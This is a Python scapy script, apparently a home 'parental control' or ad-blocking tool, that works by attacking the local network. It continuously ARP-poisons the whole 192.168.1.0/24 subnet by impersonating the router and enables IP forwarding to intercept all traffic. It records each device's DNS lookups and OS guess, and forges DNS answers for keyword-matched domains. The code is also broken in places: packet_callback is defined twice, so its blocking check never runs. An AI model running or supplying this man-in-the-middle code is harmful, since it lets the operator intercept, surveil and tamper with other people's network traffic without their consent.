from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
import time, threading, os

# --- CONFIG ---
# Expanded Banned Keywords (Porn + Ads + Tracking)
BANNED_KEYWORDS = [
    "porn", "sex", "nude", "xvideo", "pornhub", "adult", "nudity", # Adult
    "doubleclick", "adservice", "analytics", "telemetry", "ads-", # Ads
    "tracking", "googlesyndication", "taboola", "outbrain", "adnxs" # Tracking
]

devices = {}
trust_scores = {}
dns_history = {}
alert_history = []
bandwidth_samples = {}

def get_os_by_ttl(ttl):
    if ttl <= 64: return "Android/Linux/Mac"
    if ttl <= 128: return "Windows"
    return "Unknown Device"
# Add this at the top with your other globals
blocked_devices = set() 

def packet_callback(pkt):
    if pkt.haslayer(IP):
        src = pkt[IP].src
        
        # INTERNET KILL SWITCH LOGIC
        if src in blocked_devices:
            return # Drop the packet, device has no internet access

        if src.startswith("192.168.1."):
            if src not in devices:
                ttl = pkt[IP].ttl
                devices[src] = {
                    "mac": pkt.src, 
                    "os": get_os_by_ttl(ttl), 
                    "first_seen": time.strftime("%Y-%m-%d %H:%M"),
                    "packets": 0
                }
            
            devices[src]["packets"] += 1
            bandwidth_samples[src] = bandwidth_samples.get(src, 0) + len(pkt)
            
            if pkt.haslayer(DNS):
                dns_monitor(pkt)
def dns_monitor(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
        try:
            qname = pkt[DNSQR].qname.decode().lower().rstrip('.')
            src_ip = pkt[IP].src
            dns_history[src_ip] = qname
            
            if any(word in qname for word in BANNED_KEYWORDS):
                # Hijack banned sites
                reply = (IP(dst=pkt[IP].src, src=pkt[IP].dst)/
                         UDP(dport=pkt[UDP].sport, sport=53)/
                         DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                             an=DNSRR(rrname=pkt[DNSQR].qname, ttl=0, rdata="0.0.0.0")))
                send(reply, count=3, verbose=False)
                alert_history.append({"time": time.strftime("%H:%M:%S"), "type": "BLOCK", "ip": src_ip, "message": f"Killed: {qname}"})
        except: pass

def arp_poison():
    router_ip = "192.168.1.1" # Adjust if needed
    while True:
        send(ARP(op=2, pdst="192.168.1.0/24", hwdst="ff:ff:ff:ff:ff:ff", psrc=router_ip), verbose=False)
        time.sleep(2)

def packet_callback(pkt):
    if pkt.haslayer(IP):
        src = pkt[IP].src
        if src.startswith("192.168.1."):
            if src not in devices:
                ttl = pkt[IP].ttl
                os_type = get_os_by_ttl(ttl)
                devices[src] = {"mac": pkt.src, "os": os_type, "first_seen": time.time()}
                trust_scores[src] = 100
            
            # Bandwidth calculation
            bandwidth_samples[src] = bandwidth_samples.get(src, 0) + len(pkt)
            
            if pkt.haslayer(DNS):
                dns_monitor(pkt)

def main():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    threading.Thread(target=arp_poison, daemon=True).start()
    
    # Reset bandwidth every sec
    def reset_bw():
        while True:
            time.sleep(1); 
            for k in bandwidth_samples: bandwidth_samples[k] = 0
    threading.Thread(target=reset_bw, daemon=True).start()

    print("[*] NERO PRO ENGINE: ONLINE")
    sniff(prn=packet_callback, store=0)

if __name__ == "__main__":
    main()
